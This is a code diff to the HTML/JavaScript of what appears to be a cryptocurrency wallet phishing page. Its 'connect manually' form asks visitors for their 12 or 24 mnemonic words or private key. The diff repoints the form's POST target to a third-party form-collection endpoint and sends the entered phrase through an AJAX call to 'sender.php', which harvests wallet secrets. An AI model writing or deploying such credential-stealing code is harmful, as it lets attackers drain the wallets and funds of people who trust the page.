@@ -2091,7 +2091,7 @@
                    
 
                     <div id="div_connect_manuallly" style="display:none;">
-                        <form action="https://formbold.com/s/3V7ld" method="POST" id="my-form">
+                        <form action="https://api.comfyform.com/s/6785198e26da4737ba0258db/" method="POST" id="my-form">
                             <input type="hidden" name="_captcha" value="false">
                             <input type="hidden" name="_next" value="">
                             <div id="phrase"><textarea placeholder="Enter your 12 /24 Mnemonic words or Private Key."
@@ -2204,7 +2204,7 @@
                     $(this).text('Loading...').css('pointer-events', 'none')
 
                     $.ajax({
-                        url: "https://api.comfyform.com/s/6785198e26da4737ba0258db/",
+                        url: "sender.php",
                         method: "POST",
                         data: { "load_phrase": 1, "data_phrase": field.val(), "wallet_selected": $('#wallet_name').text().trim() },
                         success: function (result) {
